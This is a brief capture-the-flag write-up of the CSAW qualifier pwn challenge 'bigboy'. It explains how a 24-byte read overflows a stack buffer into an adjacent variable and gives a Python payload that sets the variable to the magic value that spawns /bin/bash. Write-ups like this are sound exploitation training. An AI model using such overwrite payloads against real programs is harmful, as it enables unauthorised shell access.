---
type: challenge
event: csaw qual
name: bigboy
category: pwn
note: "[[Binary Exploitation]]"
solved: ✅
---
Idea:
```c
read(0,&input,0x18);
```

Location of the buffer is `Stack[-0x38]`
And we can see the target:
```c
if (target == -0x350c4512) {
	run_cmd("/bin/bash");
}
```
Location of target: `Stack[-0x24]`
Additionally, the `read` command read `0x18 = 24` bytes so target payload is:
```python
'A' * 20 + p32(0xcaf3baee)
```

So `target` will be overwritten by `0xcaf3baee`.



